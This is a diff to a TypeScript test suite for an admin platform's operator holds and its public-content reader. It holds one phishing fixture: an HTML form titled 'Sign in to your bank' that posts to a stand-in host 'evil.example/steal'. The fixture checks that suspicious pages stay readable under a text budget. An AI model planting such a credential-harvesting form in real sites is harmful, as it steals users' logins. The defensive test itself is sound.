@@ -16,7 +16,8 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
 import { auditRepo, operatorHoldsRepo, operatorTalliesRepo, rolesRepo, settingsRepo, usersRepo, type MetaDb } from '@adminium/meta';
-import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
+import { sql } from 'kysely';
+import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
 
 import { createArchive } from '../src/archive/create.js';
 import { NEVER_ARCHIVED_TABLES, sanitizeDump } from '../src/archive/policy.js';
@@ -32,7 +33,8 @@ import { createApplyService } from '../src/llm/apply-service.js';
 import { AI_TOKENS_TALLY } from '../src/llm/operator-ai.js';
 import { createRunService } from '../src/llm/run-service.js';
 import { FAILURES_ALLOWED, OPERATOR_ACTOR_LABEL, tokenMatches } from '../src/operator/endpoint.js';
-import { PUBLIC_PAGES_HOLD } from '../src/operator/holds.js';
+import { createOperatorHolds, PUBLIC_PAGES_HOLD } from '../src/operator/holds.js';
+import { buildPublicContent, PUBLIC_CONTENT_FILE_TEXT_MAX, PUBLIC_CONTENT_TEXT_MAX } from '../src/operator/public-content.js';
 import { SIGN_INS_REPORTED } from '../src/operator/status.js';
 import { AVAILABLE, CRYPTO, makeStore, SECRET, SIGNING, type EngineName } from './archive.helpers.js';
 import { ADMIN_PASSWORD, adminPasswordHash, sessionCookie } from './auth-helpers.js';
@@ -305,6 +307,47 @@ for (const engine of ['sqlite', 'postgres', 'mysql'] as const) {
   });
 }
 
+describe('a hold the boot cannot read', () => {
+  const page = (served: Served) => served.composed.app.inject({ method: 'GET', url: '/apps/shop/customer/', headers: { accept: 'text/html', 'sec-fetch-mode': 'navigate' } });
+
+  it('keeps every public page hidden until it has been read once', async () => {
+    const meta = await store('sqlite');
+    // A store the hold cannot be read from: its table is not where the boot looks.
+    await sql`alter table adminium_operator_holds rename to adminium_operator_holds_aside`.execute(meta.db);
+    const served = await serve(meta, 'sqlite');
+    expect(served.composed.app.operatorHolds.unread()).toBe(true);
+    const hidden = await page(served);
+    expect(hidden.statusCode).toBe(404);
+    expect(hidden.body).not.toContain('Fresh bread');
+    // Staff pages are not public doors: they answer on.
+    expect((await served.composed.app.inject({ method: 'GET', url: '/api/v1/system/info' })).statusCode).toBe(200);
+  });
+
+  it('shows them as before once the store reads', async () => {
+    const served = await serve(await store('sqlite'), 'sqlite');
+    expect(served.composed.app.operatorHolds.unread()).toBe(false);
+    const shown = await page(served);
+    expect(shown.statusCode).toBe(200);
+    expect(shown.body).toContain('Fresh bread');
+  });
+
+  it('tries again until the read works, then stops', async () => {
+    const meta = await store('sqlite');
+    await sql`alter table adminium_operator_holds rename to adminium_operator_holds_aside`.execute(meta.db);
+    const failures: Error[] = [];
+    const holds = createOperatorHolds(meta, { retryMs: 20, onRetryFailed: (error) => failures.push(error) });
+    cleanups.push(async () => holds.close());
+    expect(await holds.load()).not.toBeNull();
+    expect(holds.unread()).toBe(true);
+    await vi.waitFor(() => expect(failures.length).toBeGreaterThan(0));
+    await sql`alter table adminium_operator_holds_aside rename to adminium_operator_holds`.execute(meta.db);
+    await vi.waitFor(() => expect(holds.unread()).toBe(false));
+    const seen = failures.length;
+    await new Promise((resolve) => setTimeout(resolve, 80));
+    expect(failures.length).toBe(seen);
+  });
+});
+
 describe('nothing but the operator endpoint touches the hold', () => {
   it('no settings write, config export, config import or archive reads or writes it', async () => {
     const meta = await store('sqlite');
@@ -362,6 +405,26 @@ describe('public content', () => {
     expect(files.find((file) => file.path === 'assets/logo.png')).toMatchObject({ bytes: 4 });
     expect(files.find((file) => file.path === 'assets/logo.png')?.text).toBeUndefined();
     expect(content.forms).toEqual([]);
+  });
+});
+
+describe('public content past its text budget', () => {
+  it('reads the pages first and marks every file and side whose text it left out', async () => {
+    const side = join(root, 'padded', 'customer');
+    await mkdir(join(side, 'a'), { recursive: true });
+    // More text, in files sorted before the page, than the whole budget.
+    const files = Math.ceil(PUBLIC_CONTENT_TEXT_MAX / PUBLIC_CONTENT_FILE_TEXT_MAX) + 1;
+    const pad = 'x'.repeat(PUBLIC_CONTENT_FILE_TEXT_MAX);
+    for (let i = 0; i < files; i += 1) await writeFile(join(side, 'a', `pad-${String(i).padStart(2, '0')}.txt`), pad);
+    await writeFile(join(side, 'index.html'), '<form action="https://evil.example/steal">Sign in to your bank</form>');
+    const surface = { appKey: 'padded', side: 'customer', root: side, prefix: '/apps/padded/customer' } as unknown as HostedSurface;
+    const content = await buildPublicContent({ surfaces: () => [surface], forms: null });
+    const read = content.sides[0]!;
+    expect(read.files.find((file) => file.path === 'index.html')?.text).toContain('evil.example/steal');
+    const left = read.files.filter((file) => file.text === undefined);
+    expect(left.length).toBeGreaterThan(0);
+    for (const file of left) expect(file.truncated, file.path).toBe(true);
+    expect(read.truncated).toBe(true);
   });
 });
 
